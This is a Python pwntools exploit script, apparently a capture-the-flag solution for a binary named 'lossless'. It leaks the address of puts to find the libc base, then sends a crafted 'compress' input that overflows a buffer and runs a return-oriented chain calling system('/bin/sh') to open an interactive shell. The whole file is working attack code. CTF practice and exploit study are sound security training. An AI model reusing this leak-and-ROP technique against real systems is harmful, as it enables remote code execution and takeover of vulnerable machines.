from pwn import *

context.terminal = ["kitty"]
script = """
c
"""

libc = ELF("./libc.so.6")

if args.REMOTE:
    p = remote("chall.pwnoh.io", 13379)
elif args.GDB:
    p = gdb.debug("./lossless", gdbscript=script)
else:
    p = process("./lossless")

def enc(string):
    if type(string) == str:
        return string.encode()
    return string

def compress(strings):
    strings = list(map(enc, strings))

    result = p8(len(strings[0])) + b"\x07" + strings[0]
    for string in strings[1:-1]:
        result += p8(len(string) - 1)
        result += string
    result += p8(len(strings[-1]))
    result += strings[-1]

    log.info(f"result: {result}")
    return result

p.recvuntil(b"puts: ")
leak = int(p.recvline(), 16)
libcbase = leak - libc.sym.puts
log.info(f"leak: 0x{leak:x}")
log.info(f"libcbase: 0x{libcbase:x}")

p.sendline(b"compress")

allocated = 0xc8 + 0x30
offset = 0x40

# 330295 965873 965877 965880
poprdi = p64(libcbase + 0x000000000002a3e5)
shell = p64(libcbase + next(libc.search(b"/bin/sh\x00")))
system = p64(libcbase + libc.sym.system)
ret = p64(libcbase + 0x0000000000029cd6)

chain = b""
chain += poprdi
chain += shell
chain += ret
chain += system

payload = b"Z " + b"A " * (allocated - offset - 6 >> 1) + chain
p.sendline(payload)

p.interactive()